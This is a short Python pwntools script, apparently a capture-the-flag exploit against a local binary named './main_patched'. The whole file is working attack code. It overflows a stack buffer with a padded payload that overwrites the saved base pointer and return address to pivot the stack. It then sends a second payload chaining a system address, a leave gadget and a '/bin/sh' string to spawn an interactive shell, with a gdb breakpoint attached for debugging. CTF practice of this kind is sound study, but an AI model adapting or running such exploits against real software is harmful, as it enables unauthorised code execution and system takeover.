from pwn import *

p=process("./main_patched")

gdb.attach(p,'''
        b* 0x0000000000401347
        c

''')
rbp=0x11223344
target=0x000000404000 #0x000000404018
rbp=target+0x20+0x40
p.sendline(b"a"*0x30+p64(target)+p64(0x21)+p64(0x200)+p64(0)+b"x"*0x20+p64(rbp)+p64(0x0000000000401381)) # +p64(rbp)+p64(0xddddddddd)

#p.sendline(p64(0x00000000004011d6).ljust(0xa8,b"a")+b"/bin/sh\x00")
system=0x4011e6
leave=0x00000000004013af
p.sendline(p64(system)+p64(0x000000401056)*2+p64(leave)+b"/bin/sh\x00")


p.interactive()